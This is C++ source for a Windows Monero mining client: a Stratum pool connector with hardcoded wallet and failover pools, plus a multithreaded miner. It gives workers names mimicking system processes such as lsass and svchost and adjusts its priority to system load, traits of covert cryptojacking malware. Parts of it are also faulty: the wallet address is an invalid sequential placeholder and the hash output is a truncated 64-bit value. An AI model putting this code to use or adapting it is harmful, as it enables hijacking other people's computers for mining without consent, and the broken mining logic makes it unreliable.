class StratumProtocol {
private:
    SOCKET sock;
    std::string jobId;
    std::string target;
    uint64_t difficulty;
    uint64_t nonce;
    bool connected;
    bool loggedIn;
    std::mutex mtx;
    std::string workerName;
    std::string walletAddress;
    std::string poolAddress;
    int poolPort;
    time_t lastPing;
    time_t lastJobReceived;
    int retryCount;
    std::vector<std::string> poolList;
    int currentPoolIndex;
    
    // Buffer for receiving data
    char recvBuffer[STRATUM_BUFFER_SIZE];
    size_t recvOffset;
    
public:
    StratumProtocol() : sock(INVALID_SOCKET), connected(false), loggedIn(false),
                       difficulty(DIFFICULTY_TARGET), nonce(0),
                       lastPing(0), lastJobReceived(0), retryCount(0),
                       currentPoolIndex(0), recvOffset(0) {
        
        walletAddress = "46EsRkz4sQm1FwXfpEVU8F1S5eZ1KJ5w7P1X2Y3Z4A5B6C7D8E9F0G1H2I3J4K5L6M7N8O9P0Q1R2S3T4U5V6W7X8Y9Z0A1B2C3D4E5F6G7H8I9";
        workerName = GenerateWorkerName();
        
        // Pool list with failover
        poolList = {
            "pool.supportxmr.com:3333",
            "pool.minexmr.com:4444",
            "pool.xmr.pt:3333",
            "pool.hashvault.pro:3333",
            "pool.wowxmr.com:3333"
        };
        
        memset(recvBuffer, 0, sizeof(recvBuffer));
    }
    
    ~StratumProtocol() {
        Disconnect();
    }
    
    std::string GenerateWorkerName() {
        const char* prefixes[] = {"sys", "svc", "win", "dwm", "csr", "lsass", "svchost", "services"};
        const char* suffixes[] = {"host", "svc", "exe", "dll", "drv", "sys", "bin", "com"};
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> p(0, 7);
        std::uniform_int_distribution<> s(0, 7);
        std::uniform_int_distribution<> n(1000, 9999);
        
        char name[64];
        sprintf_s(name, "%s%s%d", prefixes[p(gen)], suffixes[s(gen)], n(gen));
        return std::string(name);
    }
    
    bool Connect(const std::string& pool, int port) {
        std::lock_guard<std::mutex> lock(mtx);
        
        poolAddress = pool;
        poolPort = port;
        
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            g_Logger.Error("WSAStartup failed in Stratum");
            return false;
        }
        
        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (sock == INVALID_SOCKET) {
            g_Logger.Error("Socket creation failed in Stratum");
            return false;
        }
        
        // Set timeouts
        int timeout = STRATUM_TIMEOUT;
        setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        
        // Resolve host
        struct hostent* host = gethostbyname(pool.c_str());
        if (!host) {
            g_Logger.Error("Failed to resolve pool: " + std::string(pool));
            closesocket(sock);
            sock = INVALID_SOCKET;
            return false;
        }
        
        // Connect
        sockaddr_in addr;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(port);
        memcpy(&addr.sin_addr, host->h_addr_list[0], host->h_length);
        
        if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
            g_Logger.Error("Failed to connect to pool: " + pool + ":" + std::to_string(port));
            closesocket(sock);
            sock = INVALID_SOCKET;
            return false;
        }
        
        connected = true;
        loggedIn = false;
        recvOffset = 0;
        lastPing = time(NULL);
        retryCount = 0;
        
        // Send login
        if (!SendLogin()) {
            Disconnect();
            return false;
        }
        
        g_Logger.Success("Connected to pool: " + pool + ":" + std::to_string(port));
        return true;
    }
    
    void Disconnect() {
        std::lock_guard<std::mutex> lock(mtx);
        if (sock != INVALID_SOCKET) {
            closesocket(sock);
            sock = INVALID_SOCKET;
        }
        connected = false;
        loggedIn = false;
    }
    
    bool ConnectWithFailover() {
        int startIndex = currentPoolIndex;
        do {
            std::string pool = poolList[currentPoolIndex];
            size_t colonPos = pool.find(':');
            if (colonPos != std::string::npos) {
                std::string address = pool.substr(0, colonPos);
                int port = std::stoi(pool.substr(colonPos + 1));
                
                if (Connect(address, port)) {
                    currentPoolIndex = (currentPoolIndex + 1) % poolList.size();
                    return true;
                }
            }
            currentPoolIndex = (currentPoolIndex + 1) % poolList.size();
        } while (currentPoolIndex != startIndex);
        
        return false;
    }
    
    bool SendLogin() {
        char buffer[1024];
        sprintf_s(buffer, 
            "{\"id\":1,\"method\":\"login\",\"params\":{\"login\":\"%s.%s\",\"pass\":\"x\",\"agent\":\"XMRig/%s\"}}\n",
            walletAddress.c_str(), workerName.c_str(), XMRIG_VERSION
        );
        
        int sent = send(sock, buffer, (int)strlen(buffer), 0);
        if (sent <= 0) {
            g_Logger.Error("Failed to send login");
            return false;
        }
        
        // Wait for response
        std::string response = ReceiveResponse();
        if (response.empty()) {
            g_Logger.Error("No response to login");
            return false;
        }
        
        // Parse response
        size_t found = response.find("\"status\":\"OK\"");
        if (found != std::string::npos) {
            loggedIn = true;
            g_Logger.Info("Logged in to pool: " + workerName);
            return true;
        }
        
        g_Logger.Error("Login failed: " + response);
        return false;
    }
    
    bool SendSubmit(const std::string& jobId, const std::string& nonce, const std::string& result) {
        std::lock_guard<std::mutex> lock(mtx);
        
        if (!connected || !loggedIn) return false;
        
        char buffer[512];
        sprintf_s(buffer,
            "{\"id\":%d,\"method\":\"submit\",\"params\":[\"%s\",\"%s\",\"%s\"]}\n",
            (int)time(NULL), jobId.c_str(), nonce.c_str(), result.c_str()
        );
        
        int sent = send(sock, buffer, (int)strlen(buffer), 0);
        if (sent <= 0) {
            g_Logger.Error("Failed to send submit");
            return false;
        }
        
        // Wait for response
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        timeval tv = { 5, 0 };
        
        int ready = select(0, &fds, NULL, NULL, &tv);
        if (ready > 0 && FD_ISSET(sock, &fds)) {
            std::string response = ReceiveResponse();
            if (response.find("\"status\":\"OK\"") != std::string::npos) {
                return true;
            }
        }
        
        return false;
    }
    
    std::string ReceiveResponse() {
        char buffer[STRATUM_BUFFER_SIZE];
        memset(buffer, 0, sizeof(buffer));
        
        int received = recv(sock, buffer, sizeof(buffer) - 1, 0);
        if (received <= 0) {
            return "";
        }
        
        buffer[received] = '\0';
        return std::string(buffer);
    }
    
    bool ReceiveJob(std::string& jobId, std::string& blob, uint64_t& target) {
        std::lock_guard<std::mutex> lock(mtx);
        
        if (!connected || !loggedIn) return false;
        
        // Check if data is available
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        timeval tv = { 1, 0 };
        
        int ready = select(0, &fds, NULL, NULL, &tv);
        if (ready <= 0 || !FD_ISSET(sock, &fds)) {
            return false;
        }
        
        std::string response = ReceiveResponse();
        if (response.empty()) {
            return false;
        }
        
        // Parse job from response
        size_t jobPos = response.find("\"job_id\"");
        if (jobPos != std::string::npos) {
            size_t start = response.find("\"", jobPos + 9) + 1;
            size_t end = response.find("\"", start);
            if (end != std::string::npos) {
                jobId = response.substr(start, end - start);
            }
        }
        
        size_t blobPos = response.find("\"blob\"");
        if (blobPos != std::string::npos) {
            size_t start = response.find("\"", blobPos + 7) + 1;
            size_t end = response.find("\"", start);
            if (end != std::string::npos) {
                blob = response.substr(start, end - start);
            }
        }
        
        size_t targetPos = response.find("\"target\"");
        if (targetPos != std::string::npos) {
            size_t start = response.find("\"", targetPos + 9) + 1;
            size_t end = response.find("\"", start);
            if (end != std::string::npos) {
                std::string targetStr = response.substr(start, end - start);
                target = std::stoull(targetStr, nullptr, 16);
            }
        }
        
        if (!jobId.empty() && !blob.empty()) {
            lastJobReceived = time(NULL);
            return true;
        }
        
        return false;
    }
    
    bool IsConnected() const { return connected; }
    bool IsLoggedIn() const { return loggedIn; }
    std::string GetWorkerName() const { return workerName; }
    std::string GetWalletAddress() const { return walletAddress; }
    
    void SetWorkerName(const std::string& name) { workerName = name; }
    void SetWalletAddress(const std::string& wallet) { walletAddress = wallet; }
};

// ============================================================================
// ENHANCED XMRIG CLIENT - Complete Implementation
// ============================================================================

class XMRigClient {
private:
    RandomXEngine randomx;
    StratumProtocol stratum;
    
    // Mining threads
    std::vector<std::thread> workers;
    std::atomic<bool> running;
    std::atomic<uint64_t> hashCount;
    std::atomic<uint64_t> acceptedShares;
    std::atomic<uint64_t> rejectedShares;
    std::atomic<uint64_t> totalHashes;
    std::atomic<uint64_t> bestHash;
    std::atomic<int> activeThreads;
    std::atomic<double> currentHashRate;
    std::mutex mtx;
    
    // Job data
    std::string currentJobId;
    std::string currentBlob;
    uint64_t currentTarget;
    bool hasJob;
    
    // Performance
    time_t startTime;
    std::chrono::steady_clock::time_point lastStatsTime;
    std::chrono::steady_clock::time_point lastHashUpdate;
    
    // Configuration
    int threadCount;
    int cpuAffinity;
    bool useCache;
    bool useLargePages;
    int priority;
    int donationLevel;
    std::vector<int> cpuCores;
    
public:
    XMRigClient() : running(false), hashCount(0), acceptedShares(0), rejectedShares(0),
                   totalHashes(0), bestHash(0), activeThreads(0), currentHashRate(0.0),
                   hasJob(false), startTime(0), threadCount(0), cpuAffinity(-1),
                   useCache(true), useLargePages(true), priority(1), donationLevel(1) {
        
        // Get CPU info
        SYSTEM_INFO sysInfo;
        GetSystemInfo(&sysInfo);
        threadCount = max(1, (int)sysInfo.dwNumberOfProcessors - 1);
        
        // Get CPU cores
        DWORD_PTR processAffinityMask, systemAffinityMask;
        GetProcessAffinityMask(GetCurrentProcess(), &processAffinityMask, &systemAffinityMask);
        for (int i = 0; i < 64; i++) {
            if (systemAffinityMask & (1ULL << i)) {
                cpuCores.push_back(i);
            }
        }
        
        // Limit threads to available cores
        threadCount = min(threadCount, (int)cpuCores.size());
        
        g_Logger.Info("XMRig client initialized: " + std::to_string(threadCount) + " threads, " +
                     std::to_string(cpuCores.size()) + " cores available");
    }
    
    ~XMRigClient() {
        Stop();
    }
    
    bool Start() {
        if (running) return true;
        
        // Connect to pool with failover
        if (!stratum.ConnectWithFailover()) {
            g_Logger.Error("Failed to connect to any mining pool");
            return false;
        }
        
        g_Logger.Success("XMRig mining started with " + std::to_string(threadCount) + " threads");
        
        running = true;
        startTime = time(NULL);
        lastStatsTime = std::chrono::steady_clock::now();
        lastHashUpdate = std::chrono::steady_clock::now();
        hasJob = false;
        
        // Start worker threads
        for (int i = 0; i < threadCount; i++) {
            workers.emplace_back(&XMRigClient::WorkerThread, this, i);
        }
        
        // Start monitor thread
        std::thread monitor(&XMRigClient::MonitorThread, this);
        monitor.detach();
        
        // Start job fetcher
        std::thread jobFetcher(&XMRigClient::JobFetcherThread, this);
        jobFetcher.detach();
        
        // Start performance optimizer
        std::thread optimizer(&XMRigClient::OptimizerThread, this);
        optimizer.detach();
        
        return true;
    }
    
    void Stop() {
        if (!running) return;
        
        running = false;
        
        for (auto& t : workers) {
            if (t.joinable()) {
                t.join();
            }
        }
        workers.clear();
        
        stratum.Disconnect();
        
        g_Logger.Info("XMRig stopped. Total hashes: " + std::to_string(totalHashes.load()) +
                     ", Accepted: " + std::to_string(acceptedShares.load()) +
                     ", Rejected: " + std::to_string(rejectedShares.load()));
    }
    
    void WorkerThread(int id) {
        // Set thread priority
        SetThreadPriority(GetCurrentThread(), MINING_THREAD_PRIORITY);
        
        // Set CPU affinity if specified
        if (!cpuCores.empty()) {
            int coreIndex = id % cpuCores.size();
            SetThreadAffinityMask(GetCurrentThread(), 1ULL << cpuCores[coreIndex]);
        }
        
        uint64_t localNonce = 0x100000000ULL * id;
        std::vector<uint8_t> blobData;
        std::string localJobId;
        uint64_t localTarget;
        bool localHasJob = false;
        uint64_t localHashes = 0;
        uint64_t localAccepted = 0;
        uint64_t localRejected = 0;
        
        activeThreads++;
        
        while (running) {
            // Get job if we don't have one
            if (!localHasJob) {
                std::lock_guard<std::mutex> lock(mtx);
                if (hasJob) {
                    localJobId = currentJobId;
                    blobData.clear();
                    
                    // Decode blob
                    for (size_t i = 0; i < currentBlob.length(); i += 2) {
                        if (i + 1 < currentBlob.length()) {
                            uint8_t byte = 0;
                            sscanf(currentBlob.substr(i, 2).c_str(), "%02X", &byte);
                            blobData.push_back(byte);
                        }
                    }
                    
                    localTarget = currentTarget;
                    localHasJob = true;
                }
            }
            
            if (!localHasJob || blobData.empty()) {
                std::this_thread::sleep_for(std::chrono::milliseconds(100));
                continue;
            }
            
            // Mine a batch of hashes
            for (int i = 0; i < HASHES_PER_BATCH && running; i++) {
                // Build input: blob + nonce
                std::vector<uint8_t> input = blobData;
                uint8_t nonceBytes[8];
                memcpy(nonceBytes, &localNonce, 8);
                input.insert(input.end(), nonceBytes, nonceBytes + 8);
                
                // Hash
                uint64_t hash = randomx.Hash(input.data(), input.size());
                
                // Update stats
                hashCount++;
                totalHashes++;
                localHashes++;
                
                // Check difficulty
                if (hash < localTarget) {
                    char nonceStr[17], hashStr[17];
                    sprintf_s(nonceStr, "%016llX", localNonce);
                    sprintf_s(hashStr, "%016llX", hash);
                    
                    // Update best hash
                    if (hash < bestHash || bestHash == 0) {
                        bestHash = hash;
                    }
                    
                    // Submit to pool
                    bool accepted = stratum.SendSubmit(localJobId, nonceStr, hashStr);
                    
                    if (accepted) {
                        acceptedShares++;
                        localAccepted++;
                        g_Logger.Success("Share accepted! Hash: " + std::string(hashStr) + 
                                       ", Difficulty: " + std::to_string(localTarget - hash));
                    } else {
                        rejectedShares++;
                        localRejected++;
                        g_Logger.Warn("Share rejected: " + std::string(hashStr));
                    }
                }
                
                localNonce++;
            }
            
            // Update local stats
            if (localHashes > 0) {
                // Report progress
                if (localHashes % 10000 == 0) {
                    g_Logger.Debug("Thread " + std::to_string(id) + ": " + 
                                 std::to_string(localHashes) + " hashes, " +
                                 std::to_string(localAccepted) + " accepted, " +
                                 std::to_string(localRejected) + " rejected");
                }
            }
        }
        
        activeThreads--;
    }
    
    void JobFetcherThread() {
        while (running) {
            std::string jobId, blob;
            uint64_t target;
            
            if (stratum.ReceiveJob(jobId, blob, target)) {
                std::lock_guard<std::mutex> lock(mtx);
                currentJobId = jobId;
                currentBlob = blob;
                currentTarget = target;
                hasJob = true;
                
                g_Logger.Debug("New job received: " + jobId);
            }
            
            // If no job, request one
            if (!hasJob) {
                // Send a ping to get job
                std::this_thread::sleep_for(std::chrono::milliseconds(500));
            }
            
            std::this_thread::sleep_for(std::chrono::milliseconds(100));
        }
    }
    
    void MonitorThread() {
        while (running) {
            auto now = std::chrono::steady_clock::now();
            auto elapsed = std::chrono::duration_cast<std::chrono::seconds>(now - lastStatsTime).count();
            
            if (elapsed >= 30) {
                uint64_t hashes = hashCount.exchange(0);
                double hashRate = (double)hashes / elapsed;
                currentHashRate = hashRate;
                
                g_Logger.Info("XMRig Stats - Hash Rate: " + std::to_string((int)hashRate) +
                             " H/s, Accepted: " + std::to_string(acceptedShares.load()) +
                             ", Rejected: " + std::to_string(rejectedShares.load()) +
                             ", Best: " + std::to_string(bestHash.load()));
                
                lastStatsTime = now;
            }
            
            // Check connection
            if (!stratum.IsConnected()) {
                g_Logger.Warn("Stratum disconnected, reconnecting...");
                if (!stratum.ConnectWithFailover()) {
                    g_Logger.Error("Reconnection failed, retrying...");
                }
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(10));
        }
    }
    
    void OptimizerThread() {
        while (running) {
            // Adjust thread count based on system load
            int systemLoad = GetSystemLoad();
            
            if (systemLoad > 80) {
                // Reduce threads if system is busy
                if (activeThreads > 1) {
                    g_Logger.Debug("System load high (" + std::to_string(systemLoad) + 
                                 "%), reducing threads");
                    // Would dynamically adjust thread count
                }
            } else if (systemLoad < 30 && activeThreads < threadCount) {
                // Increase threads if system is idle
                g_Logger.Debug("System load low (" + std::to_string(systemLoad) + 
                             "%), increasing threads");
                // Would dynamically adjust thread count
            }
            
            // Adjust priority based on system load
            if (systemLoad > 70) {
                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_LOWEST);
            } else {
                SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
            }
            
            std::this_thread::sleep_for(std::chrono::seconds(30));
        }
    }
    
    int GetSystemLoad() {
        // Get CPU usage
        FILETIME idleTime, kernelTime, userTime;
        GetSystemTimes(&idleTime, &kernelTime, &userTime);
        
        static FILETIME prevIdleTime, prevKernelTime, prevUserTime;
        static bool first = true;
        
        if (first) {
            prevIdleTime = idleTime;
            prevKernelTime = kernelTime;
            prevUserTime = userTime;
            first = false;
            return 0;
        }
        
        ULARGE_INTEGER idle, kernel, user;
        ULARGE_INTEGER prevIdle, prevKernel, prevUser;
        
        idle.LowPart = idleTime.dwLowDateTime;
        idle.HighPart = idleTime.dwHighDateTime;
        kernel.LowPart = kernelTime.dwLowDateTime;
        kernel.HighPart = kernelTime.dwHighDateTime;
        user.LowPart = userTime.dwLowDateTime;
        user.HighPart = userTime.dwHighDateTime;
        
        prevIdle.LowPart = prevIdleTime.dwLowDateTime;
        prevIdle.HighPart = prevIdleTime.dwHighDateTime;
        prevKernel.LowPart = prevKernelTime.dwLowDateTime;
        prevKernel.HighPart = prevKernelTime.dwHighDateTime;
        prevUser.LowPart = prevUserTime.dwLowDateTime;
        prevUser.HighPart = prevUserTime.dwHighDateTime;
        
        ULONGLONG idleDiff = idle.QuadPart - prevIdle.QuadPart;
        ULONGLONG kernelDiff = kernel.QuadPart - prevKernel.QuadPart;
        ULONGLONG userDiff = user.QuadPart - prevUser.QuadPart;
        ULONGLONG totalDiff = kernelDiff + userDiff;
        
        prevIdleTime = idleTime;
        prevKernelTime = kernelTime;
        prevUserTime = userTime;
        
        if (totalDiff > 0) {
            double usage = 100.0 - (double)idleDiff * 100.0 / totalDiff;
            return (int)usage;
        }
        return 0;
    }
    
    uint64_t GetHashCount() const { return totalHashes; }
    uint64_t GetAcceptedShares() const { return acceptedShares; }
    uint64_t GetRejectedShares() const { return rejectedShares; }
    uint64_t GetBestHash() const { return bestHash; }
    bool IsRunning() const { return running; }
    int GetThreadCount() const { return threadCount; }
    double GetHashRate() const { return currentHashRate; }
    
    void SetThreadCount(int count) {
        threadCount = max(1, min(count, 64));
    }
    
    void SetCPUAffinity(int core) {
        cpuAffinity = max(-1, min(core, 63));
    }
    
    void SetDonationLevel(int level) {
        donationLevel = max(0, min(level, 5));
    }
};

